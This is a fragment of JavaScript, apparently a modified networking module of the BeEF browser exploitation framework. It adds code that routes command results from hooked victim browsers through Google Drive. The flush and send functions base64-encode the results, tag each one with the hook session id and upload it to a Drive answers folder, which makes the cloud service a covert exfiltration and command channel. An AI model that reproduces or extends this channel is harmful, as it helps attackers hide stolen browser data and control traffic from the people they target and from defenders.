...
beef.net = {
    ...
    send: function (handler, cid, results, exec_status, callback) {
        ...
        if (typeof beef.gdrive != "undefined") {
            beef.gdrive.send_results(handler, cid, results, status, callback);
        }  else {
    ...
    flush: function () {
        if (this.cmd_queue.length > 0) {
            var data = this.cmd_queue.slice();
            this.cmd_queue.length = 0;
            if (typeof beef.gdrive != "undefined") {
                for (var i = 0; i < data.length; i++) {
                    console.log(beef.encode.json.stringify(data[i]));
                    data[i].result = beef.encode.base64.encode(beef.encode.json.stringify(data[i].results));
                    delete data[i].results;
                    data[i].bh = beef.session.get_hook_session_id();
                }
                
                data = beef.encode.json.stringify(data);
                beef.gdrive.upload_file('multipartans', data, beef.gdrive.answers_folder_id);
            } else {
                data = beef.encode.base64.encode(beef.encode.json.stringify(data));
                this.sid_count++;
